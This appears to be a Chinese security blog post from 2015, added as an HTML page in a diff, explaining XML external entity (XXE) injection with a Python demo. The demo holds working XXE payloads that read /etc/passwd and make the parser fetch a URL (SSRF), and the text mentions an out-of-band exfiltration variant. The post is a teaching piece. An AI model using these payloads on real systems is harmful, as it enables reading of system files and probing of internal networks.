@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>xml实体注入xxe - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="xml实体注入xxe - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/268/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            
+        </div>
+        <h1>xml实体注入xxe</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2015-05-28 23:21"><i class="iconfont icon-date"></i>2015-05-28 23:21</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <p>xxe就是xml实体注入，先稍微就说一下XML entity:</p>
+
+<blockquote>
+  <p>entity翻译为”实体”。它的作用类似word中的”宏”，也可以理解为DW中的模板，你可以预先定义一个entity，然后在一个文档中多次调用，或者在多个文档中调用同一个entity(XML定义了两种类型的entity。一种是我们这里说的普通entity，在XML文档中使用；另一种是参数entity，在DTD文件中使用。</p>
+</blockquote>
+
+<p>借助XXE,攻击者可以实现任意文件读取,DOS拒绝服务攻击以及代理扫描内网等.</p>
+
+<!--more-->
+
+<p>这里是一个Python的demo</p>
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="c"># coding=utf-8</span>
+<span class="kn">import</span> <span class="nn">xml.sax</span>
+
+<span class="n">x</span> <span class="o">=</span> <span class="s">"""&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;!DOCTYPE xdsec [
+&lt;!ELEMENT methodname ANY &gt;
+&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
+&lt;methodcall&gt;
+&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;
+&lt;/methodcall&gt;
+"""</span>
+
+<span class="n">x1</span> <span class="o">=</span> <span class="s">"""&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;!DOCTYPE xdsec [
+&lt;!ELEMENT methodname ANY &gt;
+&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:8005/xml.test" &gt;]&gt;
+&lt;methodcall&gt;
+&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;
+&lt;/methodcall&gt;
+"""</span>
+
+
+<span class="k">class</span> <span class="nc">MyContentHandler</span><span class="p">(</span><span class="n">xml</span><span class="o">.</span><span class="n">sax</span><span class="o">.</span><span class="n">ContentHandler</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">xml</span><span class="o">.</span><span class="n">sax</span><span class="o">.</span><span class="n">ContentHandler</span><span class="o">.</span><span class="n">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">startElement</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">attrs</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">chars</span> <span class="o">=</span> <span class="s">""</span>
+
+    <span class="k">def</span> <span class="nf">endElement</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+        <span class="k">print</span> <span class="n">name</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">chars</span>
+
+    <span class="k">def</span> <span class="nf">characters</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">chars</span> <span class="o">+=</span> <span class="n">content</span>
+
+
+<span class="n">parser</span> <span class="o">=</span> <span class="n">MyContentHandler</span><span class="p">()</span>
+<span class="k">print</span> <span class="n">xml</span><span class="o">.</span><span class="n">sax</span><span class="o">.</span><span class="n">parseString</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">parser</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">xml</span><span class="o">.</span><span class="n">sax</span><span class="o">.</span><span class="n">parseString</span><span class="p">(</span><span class="n">x1</span><span class="p">,</span> <span class="n">parser</span><span class="p">)</span>
+
+</code></pre>
+</div>
+<p>xml.test的文件内容是字符串<code class="highlighter-rouge">Hello</code></p>
+
+<p>可以看到两个的回显分别是
+<img src="http://storage.virusdefender.net/blog/images/268/1.png" alt="QQ20150528-2@2x.png" />
+<img src="http://storage.virusdefender.net/blog/images/268/2.png" alt="QQ20150528-3@2x.png" /></p>
+
+<p>其中下面的这个能看到实际请求了这个地址，还可能造成ssrf
+<img src="http://storage.virusdefender.net/blog/images/268/3.png" alt="QQ20150528-1@2x.png" /></p>
+
+<p>其实还有一个demo，可以将读取的文件发送出来，可以用于没有回显的场景下，作者是使用的php，我用Python但是暂时没测试成功，稍后再发出来。</p>
+
+<p>wooyun上现有的典型漏洞</p>
+
+<p><a href="http://www.wooyun.org/bugs/wooyun-2010-059911">http://www.wooyun.org/bugs/wooyun-2010-059911</a></p>
+
+<p><a href="http://www.wooyun.org/bugs/wooyun-2010-073321">http://www.wooyun.org/bugs/wooyun-2010-073321</a></p>
+
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=xml实体注入xxe&article_id=/index.php/archives/268/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
